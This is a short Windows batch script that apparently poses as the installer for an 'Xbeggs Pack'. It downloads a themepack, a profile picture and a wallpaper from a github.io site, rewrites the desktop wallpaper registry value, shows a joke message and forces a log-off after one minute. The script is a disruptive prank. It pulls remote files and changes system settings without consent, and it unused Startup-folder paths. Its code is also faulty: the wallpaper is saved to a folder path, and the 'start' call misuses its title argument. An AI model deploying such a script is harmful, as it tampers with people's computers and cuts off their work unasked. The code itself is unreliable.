@echo off
set "themePath=C:\Users\%username%\Documents\beeno.themepack"
set "picDir=%APPDATA%\Microsoft\Windows\AccountPictures"
set "picFile=%picDir%\%username%.png"
set "programdta=C:\ProgramData"
set "allstartup=%programdta%\Microsoft\Windows\Start Menu\Programs\Startup"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "wallpaper=C:\Users\%username%\Wallpaper"

powershell -Command "Invoke-WebRequest -Uri 'https://giggityfiles.github.io/zertilla/beeno.themepack' -OutFile '%themePath%'"
msg * "WHEN THE"
if not exist "%picDir%" mkdir "%picDir%"
powershell -Command "Invoke-WebRequest -Uri 'https://giggityfiles.github.io/giggity/redslimepfp-png.png' -OutFile '%picFile%'"
if not exist "%wallpaper%" mkdir "%wallpaper%"
powershell -Command "Invoke-WebRequest -Uri 'https://giggityfiles.github.io/giggitywallpaper.png' -OutFile '%wallpaper%'"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaper%" /f
start "%themePath%"
shutdown /l /t 60 /c "The system has finished installing the Xbeggs Pack, the system will log you off in 1 minute, save your files."